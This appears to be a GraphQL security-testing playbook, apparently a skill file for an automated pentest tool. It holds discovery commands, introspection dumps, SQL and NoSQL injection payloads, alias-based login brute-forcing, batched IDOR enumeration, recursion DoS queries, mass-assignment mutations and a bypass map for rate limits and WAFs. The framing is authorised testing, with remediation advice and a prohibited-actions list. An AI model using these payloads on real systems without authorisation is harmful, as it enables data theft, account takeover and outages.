# GraphQL API Security Testing — Skill Playbook

**Mitre ATT&CK ID:** T1190 (Exploit Public-Facing Application), T1071.001 (Web Protocols), T1595.002 (Active Scanning: Vulnerability Scanning)
**OWASP Mapping:** A01:2021 – Broken Access Control, A03:2021 – Injection, A04:2021 – Insecure Design
**Severity:** High / Critical
**Last Updated:** 2026-08-02

---

## Metadata

```yaml
skill_id: graphql-security-v2
category: graphql
author: HiveBreach
mitre_attack_id: T1190
owasp_mapping: [A01:2021-Broken Access Control, A03:2021-Injection, A04:2021-Insecure Design]
frameworks: [mitre-attack, owasp-api-security]
tags: [graphql, api, introspection, injection, dos, idor, batching, auth-bypass]
tools: [graphqlmap, clairvoyance, inql, graphql-raider, batchql, altair, burp-suite, graphw00f]
environments: [api, web]
verification_required: sandbox
```

---

## 1. Detection

### 1.1 Endpoint Discovery

```
/graphql  /graph  /graphiql  /gql  /v1/graphql  /query  /explorer  /playground
/api  /api/graphql  /graphql/console  /graphql/playground
```

Grep JS bundles for `graphql`, `__typename`, or endpoint path strings. Fingerprint the server with graphw00f (Apollo, express-graphql, Hasura, graphql-java behave differently and have different limits).

```bash
curl -s https://target.com/graphql -H "Content-Type: application/json" \
  -d '{"query":"query { __typename }"}'
# 200 with {"data":{"__typename":"Query"}} confirms GraphQL endpoint
```

### 1.2 Introspection Detection
```bash
curl -s https://target.com/graphql -H "Content-Type: application/json" \
  -d '{"query":"query { __schema { types { name } } }"}'
```

Introspection disabled returns an error such as "GraphQL introspection is not allowed". If blocked, attempt the bypass payloads in section 2.2 and tool-assisted enumeration (section 4).

---

## 2. Confirmation

### 2.1 Full Schema Dump (Introspection)
```graphql
query IntrospectionQuery {
  __schema {
    queryType { name } mutationType { name } subscriptionType { name }
    types { name kind fields { name
      type { name kind ofType { name kind ofType { name kind } } }
      args { name type { name kind ofType { name kind } } } } }
    directives { name description locations }
  }
}
```

Export to JSON for analysis. Hunt for sensitive fields (`password`, `token`, `ssn`, `secret`, `internal`, `debug`, `role`, `isAdmin`), deprecated fields, and undocumented mutations.

### 2.2 Introspection Bypass
```graphql
# Fragment-based bypass
query { __schema { types { name fields { name ... on __Type { fields { name } } } } } }

# Alias-based bypass
query { a: __schema { types { name } } b: __schema { types { fields { name } } } }
```

### 2.3 Query/Mutation Enumeration Without Introspection

- Field suggestion: `query { user { xyz } }` returns "Cannot query field 'xyz' on type 'User'. Did you mean 'username'?" — reconstruct the schema piecewise.
- Automation: clairvoyance brute-forces fields via suggestion feedback; corroborate with client-side bundle analysis.

---

## 3. Exploitation

### 3.1 SQLi / NoSQLi in Resolvers

```graphql
query { user(id: "1' OR '1'='1") { email passwordHash } }   # SQL injection
query { user(credentials: "{ \"$ne\": null }") { email passwordHash } }  # NoSQLi
query { user(id: "1 AND 1=1") { email } }   # Boolean-based blind
```

Verify each injection with a confirmable side channel: response diff, timing, or out-of-band callback. If the endpoint is gRPC-web (protobuf over POST), capture the request, decode with `grpcurl -protoset`, and re-test resolver arguments in the decoded form.

### 3.2 Batching & Alias Abuse

Batching sends many operations in one HTTP request, defeating per-request rate limits:

```graphql
query { u1: user(id: 1) { email passwordHash }
        u2: user(id: 2) { email passwordHash }
        u3: user(id: 3) { email passwordHash } }
```

Alias-based brute-force of login in a single request:

```graphql
mutation { a: login(username: "admin", password: "pass1") { token }
           b: login(username: "admin", password: "pass2") { token }
           c: login(username: "admin", password: "pass3") { token } }
```

### 3.3 Deep Recursion DoS

```graphql
query { user(id: 1) { friends { user { friends { user { friends { user { friends { name } } } } } } } } }
```

Measure response time and server load at increasing depth to confirm resource exhaustion.

### 3.4 Circular Queries

```graphql
query Circular { __type(name: "__type") { fields { type { fields { type { fields { type { name } } } } } } } }
```

### 3.5 Field Duplication / Over-Fetching

Request the same expensive field multiple times under different aliases to amplify resolver cost:

```graphql
query { a: user(id: 1) { posts { comments { body } } }
        b: user(id: 1) { posts { comments { body } } }
        c: user(id: 1) { posts { comments { body } } } }
```

### 3.6 IDOR in GraphQL

Batch IDOR to enumerate many records in one request. Test authorization per-field with aliases:

```graphql
query { mine: user(id: 1) { email } theirs: user(id: 2) { email } }
```

### 3.7 Mass Assignment in Mutations

```graphql
mutation { updateUser(id: 1, input: { role: "admin", isAdmin: true,
                                      emailVerified: true, creditBalance: 999999 }) { id role } }
```

### 3.8 Error Message Information Disclosure

```graphql
mutation { login(username: null, password: null) { token } }
```

Inspect errors for stack traces, raw SQL, internal variable names, file paths, and connection strings.

### 3.9 Authentication / Authorization Bypass

- Send queries unauthenticated and confirm fields resolve.
- Test mutations that should require elevation (`deleteUser`, `updateRole`, `createAdmin`).
- Try GET-based queries to bypass POST-body WAF rules and to poison shared caches.
- Test subscriptions for real-time data leaks without authorization checks.

---

## 4. Tool-Specific Guidance
### 4.1 graphqlmap
```bash
python3 graphqlmap.py -u https://target.com/graphql --method POST -q "{ users { email } }"
python3 graphqlmap.py -u https://target.com/graphql --dump --dostest -H "Authorization: Bearer <token>"
```
### 4.2 clairvoyance (introspection bypass)
```bash
clairvoyance -u https://target.com/graphql -w /usr/share/seclists/Discovery/Web-Content/graphql.txt -o schema.json
```

### 4.3 inql (Burp extension)
- Install from BApp store; right-click any GraphQL request and send to inql to browse the schema and generate templated requests.

### 4.4 GraphQL Raider (Burp)
- Tab-based schema viewer + query builder; send crafted queries straight to Repeater.
### 4.5 BatchQL
```bash
python3 batchql.py --mode auto --url https://target.com/graphql
```

### 4.6 Altair (client)
- Interactive GraphQL client for manual exploration: schema docs, query builder, subscriptions.
### 4.7 graphw00f (fingerprinting)
```bash
python3 main.py -t https://target.com/graphql
```

---

## 5. PoC Generation

### Template
```markdown
## [FINDING_ID] — GraphQL Introspection Enabled / IDOR via Batching
**Endpoint:** https://target.com/graphql | **Method:** POST | **Severity:** High

### Vector
Introspection exposed full schema (160 types, 840 fields, 21 mutations) and
batched queries returned cross-tenant user records without authorization checks.

### Payload
query { __schema { types { name fields { name } } } }
query { u1: user(id:1){email} u2: user(id:2){email} }

### Evidence
- Schema exported to evidence/schema.json
- User records for ids 1-100 returned unauthenticated

### Impact
- Full schema disclosure -> attacker maps access control model
- Mass data extraction bypassing rate limits
- Hidden/admin mutations discoverable

### Remediation
- Disable introspection in production or gate behind auth
- Enforce query depth/complexity limits and per-IP+per-token rate limits
- Enforce object-level authorization in every resolver
```

---

## 6. Verification (Sandbox)
- [ ] Findings reproduced on a sandbox API instance
- [ ] Introspection truly disabled (multiple query variants tested) before reporting as a non-issue
- [ ] Depth and complexity limits measured (baseline vs attack response times)
- [ ] Rate limit bypass confirmed (batched requests return data, not 429)
- [ ] IDOR confirmed against a resource the test account must not access
- [ ] Impact scoped per finding (read vs write vs admin)

### Prohibited Actions
- Deep-recursion DoS against production endpoints
- Brute-forcing credentials on live user accounts
- Dumping personally identifiable records without scope approval

---

## 7. CheatSheet
### DoS Payloads
| Type | Pattern |
|---|---|
| Deep recursion | Nested `friends { user { friends { ... } } }` |
| Circular | `__type(name:"__type")` self-reference |
| Duplication | Same field aliased N times |
| Array batching | `users(ids:[1..1000])` |

### Bypass Map
| Protection | Bypass |
|---|---|
| Introspection disabled | Field suggestion, clairvoyance, fragments/aliases |
| Depth limit | Wide queries, relay cursor pagination (`first/after`) |
| Per-request rate limit | Batching + aliases in one request |
| POST-only WAF | GET query, Content-Type confusion |

### Auth Testing Order
1. Unauthenticated field access
2. Cross-tenant IDOR via args
3. Privilege-elevation mutations
4. Alias-based per-field auth check
5. Subscription data leaks

---

## 8. Related Techniques (MITRE ATT&CK Mapping)
| Technique ID | Name | Relation |
|---|---|---|
| T1190 | Exploit Public-Facing Application | Initial access via GraphQL |
| T1595.002 | Active Scanning: Vulnerability Scanning | Introspection/enumeration |
| T1071.001 | Web Protocols | C2/exfil channel reuse |
| T1048 | Exfiltration Over Alternative Protocol | Mass data extraction |
| T1087 | Account Discovery | IDOR user enumeration |
| T1498 | Network Denial of Service | Recursion/circular DoS |

---

## 9. References

- OWASP GraphQL Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
- PayloadsAllTheThings GraphQL: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection
- HackTricks GraphQL: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql
- HackTricks gRPC-web: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/grpc-services
- graphqlmap: https://github.com/swisskyrepo/GraphQLmap
- clairvoyance: https://github.com/nikitastupin/clairvoyance
- inql: https://github.com/nikitastupin/inql
- BatchQL: https://github.com/assetnote/batchql
---

*This playbook is for authorised security testing only. All verification must occur in sandbox environments.*
